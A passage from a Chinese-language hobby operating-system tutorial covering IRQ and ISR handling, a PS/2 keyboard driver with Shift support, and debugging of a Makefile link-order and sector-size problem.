<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// kernel/irq.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;timer.h&quot;</span></span></span><br><span class="line">...</span><br><span class="line"><span class="type">void</span> <span class="title function_">irq_install</span><span class="params">()</span> &#123; </span><br><span class="line">    init_timer(<span class="number">100</span>);        <span class="comment">// 设置定时器</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">irq_handler</span><span class="params">(<span class="type">registers_t</span>* regs)</span> &#123;</span><br><span class="line">    <span class="comment">// 专门处理irq中断</span></span><br><span class="line">    <span class="keyword">if</span> (interrupt_handlers[regs-&gt;int_no] != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">isr_t</span> handler = interrupt_handlers[regs-&gt;int_no];</span><br><span class="line">        handler(regs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 发送 EOI</span></span><br><span class="line">    <span class="keyword">if</span> (regs-&gt;int_no &gt;= <span class="number">40</span>) &#123;</span><br><span class="line">        <span class="comment">// IRQ8-IRQ15 来自从 PIC</span></span><br><span class="line">        outb(PIC2_COMMAND, PIC_EOI);</span><br><span class="line">    &#125;</span><br><span class="line">    outb(PIC1_COMMAND, PIC_EOI);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// kernel/kernel.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;idt.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;isr.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;irq.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;screen.h&quot;</span></span></span><br><span class="line"><span class="comment">// #include &quot;keyboard.h&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">kernel_main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    clear_screen();         <span class="comment">// 清屏</span></span><br><span class="line">    print_string(<span class="string">&quot;Hello, Kernel!\n&quot;</span>);  <span class="comment">// 打印一行字符</span></span><br><span class="line">    idt_install();</span><br><span class="line">    irq_remap();</span><br><span class="line">    isr_install();</span><br><span class="line">    irq_install();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;sti&quot;</span>)</span>;    <span class="comment">// 开中断</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123; </span><br><span class="line">        <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;hlt&quot;</span>)</span>;  <span class="comment">// 节省CPU</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>这里我们还定义了一个<strong>irq_handler</strong>，这个是为了区别cpu异常和硬件中断，因为硬件中断最后需要特殊处理，比如像要在处理完成过后向主从PIC发送<strong>PIC_EOI</strong>以表示中断处理结束，从而可以进行下一次处理。那么<strong>isr_handler</strong>也需要进行一定的更改。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// isr.c</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">isr_handler</span><span class="params">(<span class="type">registers_t</span> *regs)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (regs-&gt;int_no&gt;=<span class="number">32</span>&amp;&amp;regs-&gt;int_no&lt;=<span class="number">47</span>)&#123;</span><br><span class="line">        irq_handler(regs);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        clear_screen();</span><br><span class="line">        print_string(<span class="string">&quot;Received interrupt: &quot;</span>);</span><br><span class="line">        print_dec(regs-&gt;int_no);</span><br><span class="line">        print_newline();</span><br><span class="line">        <span class="keyword">if</span> (interrupt_handlers[regs-&gt;int_no]) &#123;</span><br><span class="line">            <span class="type">isr_t</span> handler = interrupt_handlers[regs-&gt;int_no];</span><br><span class="line">            handler(regs);  <span class="comment">// 调用回调函数</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            clear_screen();</span><br><span class="line">            print_string(<span class="string">&quot;Unhandled interrupt: &quot;</span>);</span><br><span class="line">            print_dec(regs-&gt;int_no);</span><br><span class="line">            print_newline();</span><br><span class="line">    </span><br><span class="line">            <span class="keyword">while</span> (<span class="number">1</span>);  <span class="comment">// halt</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E4%B8%AD%E6%96%AD%E7%AE%A1%E7%90%86/image-20250508002508179.png"
                      class=""
                >
<h4 id="键盘输入实现">键盘输入实现</h4>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// drivers/keyboard.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_keyboard</span><span class="params">()</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// drivers/keyboard.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;keyboard.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;isr.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;screen.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;common.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEYBOARD_DATA_PORT 0x60</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> scancode_to_ascii[<span class="number">128</span>] = &#123;</span><br><span class="line">    <span class="number">0</span>,   <span class="number">27</span>, <span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;\b&#x27;</span>,   <span class="comment">// 0x00 - 0x0E</span></span><br><span class="line">    <span class="string">&#x27;\t&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;[&#x27;</span>,<span class="string">&#x27;]&#x27;</span>,<span class="string">&#x27;\n&#x27;</span>, <span class="number">0</span>,     <span class="comment">// 0x0F - 0x1D (Enter, Control)</span></span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;`&#x27;</span>,   <span class="number">0</span>, <span class="string">&#x27;\\&#x27;</span>,      <span class="comment">// 0x1E - 0x2B (Shift, \)</span></span><br><span class="line">    <span class="string">&#x27;z&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;/&#x27;</span>,   <span class="number">0</span>, <span class="string">&#x27;*&#x27;</span>,  <span class="number">0</span>,   <span class="string">&#x27; &#x27;</span>,     <span class="comment">// 0x2C - 0x39 (Space, Alt, etc)</span></span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,          <span class="comment">// 0x3A - 0x45 (F1-F10, etc)</span></span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,               <span class="comment">// 0x46 - 0x50</span></span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>                              <span class="comment">// 0x51 - 0x58 (F11, F12...)</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">keyboard_callback</span><span class="params">(<span class="type">registers_t</span> regs)</span>&#123;</span><br><span class="line">    <span class="comment">// 1. 从端口 0x60 读取扫描码（键盘输入缓冲区）</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> scancode = inb(KEYBOARD_DATA_PORT);</span><br><span class="line">     <span class="comment">// 2. 过滤掉 key-release 事件（第8位为1，表示抬起）</span></span><br><span class="line">     <span class="keyword">if</span> (scancode &amp; <span class="number">0x80</span>) &#123;</span><br><span class="line">        <span class="comment">// 是 key-up，不处理</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 3. 查表转成 ASCII 字符</span></span><br><span class="line">        <span class="type">char</span> c = scancode_to_ascii[scancode];</span><br><span class="line">        <span class="keyword">if</span> (c) &#123;</span><br><span class="line">            print_char(c);  <span class="comment">// 4. 显示字符</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_keyboard</span><span class="params">()</span>&#123;</span><br><span class="line">    register_interrupt_handler(IRQ1, keyboard_callback);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// kernel/irq.c</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">irq_install</span><span class="params">()</span> &#123; </span><br><span class="line">    init_timer(<span class="number">100</span>);        <span class="comment">// 设置定时器</span></span><br><span class="line">    init_keyboard();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// kernel/isr.c</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">isr_install</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">memset</span>(interrupt_handlers, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="type">isr_t</span>) * <span class="number">256</span>);</span><br><span class="line">    idt_set_gate(<span class="number">0</span>, (<span class="type">uint32_t</span>)isr0, <span class="number">0x08</span>, <span class="number">0x8E</span>);  <span class="comment">// div 0 fault</span></span><br><span class="line">    idt_set_gate(<span class="number">6</span>, (<span class="type">uint32_t</span>)isr6, <span class="number">0x08</span>, <span class="number">0x8E</span>);    <span class="comment">// invalid opcode fault</span></span><br><span class="line">    idt_set_gate(<span class="number">13</span>, (<span class="type">uint32_t</span>)isr13, <span class="number">0x08</span>, <span class="number">0x8E</span>);       <span class="comment">// General Protection Fault</span></span><br><span class="line">    idt_set_gate(<span class="number">0x20</span>, (<span class="type">uint32_t</span>)irq0, <span class="number">0x08</span>, <span class="number">0x8E</span>);       <span class="comment">// IRQ0,timer</span></span><br><span class="line">    idt_set_gate(<span class="number">0x21</span>, (<span class="type">unsigned</span>)irq1, <span class="number">0x08</span>, <span class="number">0x8E</span>);        <span class="comment">/// IRQ1,keyboard</span></span><br><span class="line"></span><br><span class="line">    register_interrupt_handler(<span class="number">0</span>, divide_by_zero_handler);</span><br><span class="line">    register_interrupt_handler(<span class="number">6</span>, invalid_opcode_handler);</span><br><span class="line">    register_interrupt_handler(<span class="number">13</span>, general_protection_fault_handler);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>之后加入别的<strong>IRQ</strong>也是这样一个修改流程，先写好对应的回调函数，然后在<strong>irq_install</strong>中调用注册回调函数的接口，最后在<strong>isr_install</strong>里用<strong>idt_set_gate</strong>来设置好<strong>IDT</strong>表项。</p>
<p>键盘底层是通过「扫描码（scancode）」和 CPU 交互的。</p>
<p>当你在键盘上按下一个键，比如
<code>A</code>，键盘控制器发送的是一个字节（称为
<strong>扫描码</strong>），而不是 ASCII 字符。比如：</p>
<ul>
<li><code>A</code> 键按下时，对应的扫描码是 <code>0x1E</code></li>
<li><code>B</code> 是 <code>0x30</code></li>
<li><code>Enter</code> 是 <code>0x1C</code></li>
<li><code>Space</code> 是 <code>0x39</code></li>
</ul>
<p>所以<code>scancode_to_ascii[]</code> 数组的作用是
<strong>把扫描码转换为可打印的 ASCII 字符</strong>。</p>
<p>键盘按下和抬起，都会触发中断。比如按下 <code>A</code>：</p>
<ul>
<li><code>A</code> 按下：<code>0x1E</code></li>
<li><code>A</code> 抬起：<code>0x9E</code>（0x1E + 0x80）</li>
</ul>
<p>我们通常只关心「按下时的动作」，所以用：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (scancode &amp; <span class="number">0x80</span>)</span><br></pre></td></tr></table></figure></div>
<p>判断是否是抬起，如果是就跳过。</p>
<p>然后就可以正常从键盘读取输入，不过目前的版本并不能用shift切换大小写显示。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E4%B8%AD%E6%96%AD%E7%AE%A1%E7%90%86/image-20250508103845371.png"
                      class=""
                >
<p>进行一下修改就可以实现显示shift转换后的内容</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> scancode_to_ascii_shifted[<span class="number">128</span>] = &#123;</span><br><span class="line">    <span class="number">0</span>,  <span class="number">27</span>, <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;@&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;%&#x27;</span>, <span class="string">&#x27;^&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;\b&#x27;</span>,  <span class="comment">// 0x00 - 0x0E</span></span><br><span class="line">    <span class="string">&#x27;\t&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;\n&#x27;</span>, <span class="number">0</span>,              <span class="comment">// 0x0F - 0x1D</span></span><br><span class="line">    <span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;J&#x27;</span>,<span class="string">&#x27;K&#x27;</span>,<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;~&#x27;</span>, <span class="number">0</span>, <span class="string">&#x27;|&#x27;</span>,                   <span class="comment">// 0x1E - 0x2B</span></span><br><span class="line">    <span class="string">&#x27;Z&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;V&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;?&#x27;</span>, <span class="number">0</span>, <span class="string">&#x27;*&#x27;</span>, <span class="number">0</span>, <span class="string">&#x27; &#x27;</span>,                   <span class="comment">// 0x2C - 0x39</span></span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,                             <span class="comment">// 0x3A+</span></span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>                                                    <span class="comment">// 0x50+</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">keyboard_callback</span><span class="params">(<span class="type">registers_t</span> regs)</span>&#123;</span><br><span class="line">    <span class="comment">// 1. 从端口 0x60 读取扫描码（键盘输入缓冲区）</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> scancode = inb(KEYBOARD_DATA_PORT);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 按下Shift</span></span><br><span class="line">    <span class="keyword">if</span> (scancode == <span class="number">0x2A</span> || scancode == <span class="number">0x36</span>) &#123;</span><br><span class="line">        shift_pressed = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 松开Shift</span></span><br><span class="line">    <span class="keyword">if</span> (scancode == <span class="number">0xAA</span> || scancode == <span class="number">0xB6</span>) &#123;</span><br><span class="line">        shift_pressed = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">     <span class="comment">// 2. 过滤掉 key-release 事件（第8位为1，表示抬起）</span></span><br><span class="line">     <span class="keyword">if</span> (scancode &amp; <span class="number">0x80</span>) &#123;</span><br><span class="line">        <span class="comment">// 是 key-up，不处理</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 3. 查表转成 ASCII 字符</span></span><br><span class="line">        <span class="type">char</span> c;</span><br><span class="line">        <span class="keyword">if</span> (shift_pressed) &#123;</span><br><span class="line">            c = scancode_to_ascii_shifted[scancode];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            c = scancode_to_ascii[scancode];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (c) &#123;</span><br><span class="line">            print_char(c);  <span class="comment">// 4. 显示字符</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="debug">debug</h3>
<h4 id="加载顺序问题">加载顺序问题</h4>
<p>一开始我的makefile如下，结果每次跳转到0x9000位置，执行的好像都是别的代码，而没有进行call其它函数。</p>
<div class="highlight-container" data-rel="Makefile"><figure class="iseeu highlight makefile"><table><tr><td class="code"><pre><span class="line">DIR := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line">BOOT_DIR := <span class="variable">$(DIR)</span>/boot</span><br><span class="line">KERNEL_DIR := <span class="variable">$(DIR)</span>/kernel</span><br><span class="line">DRIVER_DIR := <span class="variable">$(DIR)</span>/drivers</span><br><span class="line">ARCH_DIR := <span class="variable">$(DIR)</span>/arch/x86</span><br><span class="line">LINK_LD := <span class="variable">$(DIR)</span>/linker.ld</span><br><span class="line">TARGET := <span class="variable">$(DIR)</span>/focus-os.img</span><br><span class="line"></span><br><span class="line"><span class="comment"># 中间产物</span></span><br><span class="line">BOOT_BIN := boot.bin</span><br><span class="line">STAGE2_BIN := stage2.bin</span><br><span class="line">KERNEL_ELF := kernel.elf</span><br><span class="line">KERNEL_BIN := kernel.bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自动获取所有 .asm 文件</span></span><br><span class="line">ASM_SRCS := <span class="variable">$(<span class="built_in">wildcard</span> <span class="variable">$(ARCH_DIR)</span>/*.asm)</span></span><br><span class="line">ASM_OBJS := <span class="variable">$(<span class="built_in">patsubst</span> %.asm,%.o,<span class="variable">$(ASM_SRCS)</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 自动获取所有 .c 和 .h 文件</span></span><br><span class="line">KERNEL_SRC := <span class="variable">$(<span class="built_in">wildcard</span> <span class="variable">$(KERNEL_DIR)</span>/*.c)</span> <span class="variable">$(<span class="built_in">wildcard</span> <span class="variable">$(DRIVER_DIR)</span>/*.c)</span></span><br><span class="line">KERNEL_OBJ := $(KERNEL_SRC:.c=.o) <span class="variable">$(ASM_OBJS)</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 编译器设置</span></span><br><span class="line">CC := gcc</span><br><span class="line">CFLAGS := -m32 -g -ffreestanding -fno-pie -fno-stack-protector -nostdlib -nostartfiles -I<span class="variable">$(KERNEL_DIR)</span> -I<span class="variable">$(DRIVER_DIR)</span></span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: all clean run</span></span><br><span class="line"></span><br><span class="line"><span class="section">all: <span class="variable">$(TARGET)</span></span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(BOOT_BIN)</span>: <span class="variable">$(BOOT_DIR)</span>/boot.asm</span><br><span class="line">	nasm -f bin <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(STAGE2_BIN)</span>: <span class="variable">$(BOOT_DIR)</span>/stage2.asm</span><br><span class="line">	nasm -f bin <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 编译内核每个 .c 文件</span></span><br><span class="line"><span class="variable">$(KERNEL_DIR)</span>/%.o: <span class="variable">$(KERNEL_DIR)</span>/%.c</span><br><span class="line">	<span class="variable">$(CC)</span> <span class="variable">$(CFLAGS)</span> -c <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"><span class="comment"># 编译驱动每个 .c 文件</span></span><br><span class="line"><span class="variable">$(DRIVER_DIR)</span>/%.o: <span class="variable">$(DRIVER_DIR)</span>/%.c</span><br><span class="line">	<span class="variable">$(CC)</span> <span class="variable">$(CFLAGS)</span> -c <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"><span class="comment"># 编译每个 .asm 文件</span></span><br><span class="line"><span class="variable">$(ARCH_DIR)</span>/%.o: <span class="variable">$(ARCH_DIR)</span>/%.asm</span><br><span class="line">	nasm -f elf32 <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(KERNEL_BIN)</span>: <span class="variable">$(KERNEL_OBJ)</span> <span class="variable">$(LINK_LD)</span></span><br><span class="line">	ld -m elf_i386 -g -T <span class="variable">$(LINK_LD)</span> -o <span class="variable">$(KERNEL_ELF)</span> <span class="variable">$(KERNEL_OBJ)</span></span><br><span class="line">	objcopy -O binary <span class="variable">$(KERNEL_ELF)</span> <span class="variable">$(KERNEL_BIN)</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>: <span class="variable">$(BOOT_BIN)</span> <span class="variable">$(STAGE2_BIN)</span> <span class="variable">$(KERNEL_BIN)</span></span><br><span class="line">	dd if=/dev/zero of=<span class="variable">$(TARGET)</span> bs=512 count=2880                    </span><br><span class="line">	dd if=<span class="variable">$(BOOT_BIN)</span> of=<span class="variable">$(TARGET)</span> bs=512 count=1 conv=notrunc           </span><br><span class="line">	dd if=<span class="variable">$(STAGE2_BIN)</span> of=<span class="variable">$(TARGET)</span> bs=512 count=2 seek=1 conv=notrunc  </span><br><span class="line">	dd if=<span class="variable">$(KERNEL_BIN)</span> of=<span class="variable">$(TARGET)</span> bs=512 count=5 seek=3 conv=notrunc </span><br><span class="line"><span class="section">run:</span></span><br><span class="line">	qemu-system-i386 -fda <span class="variable">$(TARGET)</span>  -s -S</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	rm -f *.bin *.o *.elf <span class="variable">$(TARGET)</span></span><br><span class="line">	rm -f <span class="variable">$(KERNEL_DIR)</span>/*.o *.bin *.elf</span><br><span class="line">	rm -f <span class="variable">$(DRIVER_DIR)</span>/*.o *.bin *.elf</span><br><span class="line">	rm -f <span class="variable">$(ARCH_DIR)</span>/*.o *.bin *.elf</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E4%B8%AD%E6%96%AD%E7%AE%A1%E7%90%86/image-20250506225005839.png"
                      class=""
                >
<p>然后用IDA看kernel.elf文件，才发现我们的<strong>kernel_main</strong>并没有正常的加载到0x9000的起始位置，所以我们前面都是跳转到<strong>idt_set_gate</strong>函数进行执行。所以会出现问题。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E4%B8%AD%E6%96%AD%E7%AE%A1%E7%90%86/image-20250506225019244.png"
                      class=""
                >
<p>问题在于我们在指定目标<strong>KERNEL_OBJ</strong>时的顺序没有指定，这里的
<code>$(KERNEL_SRC)</code> 是由 <code>wildcard</code> 自动搜集
<code>.c</code> 文件，而 <code>wildcard</code> 的顺序是<strong>按文件名
ASCII 排序</strong>来的，不保证 <code>kernel.c</code>（含有
<code>kernel_main()</code>）是第一个。而ld只会按参数顺序进行加载。</p>
<div class="highlight-container" data-rel="Makefile"><figure class="iseeu highlight makefile"><table><tr><td class="code"><pre><span class="line">KERNEL_SRC := <span class="variable">$(<span class="built_in">wildcard</span> <span class="variable">$(KERNEL_DIR)</span>/*.c)</span> <span class="variable">$(<span class="built_in">wildcard</span> <span class="variable">$(DRIVER_DIR)</span>/*.c)</span></span><br><span class="line">KERNEL_OBJ := $(KERNEL_SRC:.c=.o) <span class="variable">$(ASM_OBJS)</span> </span><br></pre></td></tr></table></figure></div>
<p>简单的更改方式是把kernel.o单独拿出来：</p>
<div class="highlight-container" data-rel="Makefile"><figure class="iseeu highlight makefile"><table><tr><td class="code"><pre><span class="line">KERNEL_OBJ := <span class="variable">$(KERNEL_DIR)</span>/kernel.o <span class="variable">$(<span class="built_in">filter</span>-out <span class="variable">$(KERNEL_DIR)</span>/kernel.o, $(KERNEL_SRC:.c=.o)</span>) <span class="variable">$(ASM_OBJS)</span></span><br></pre></td></tr></table></figure></div>
<h4 id="磁盘预留空间问题">磁盘预留空间问题</h4>
<p>当我们的kernel.bin比较大时，我们可能之前手动指定的5个扇区长度就不够用了，会导致部分函数没有加载到内存。解决方式有两种，手动的方式是用
<code>size kernel.elf</code>
看总共占的大小，然后再算出需要的扇区数。</p>
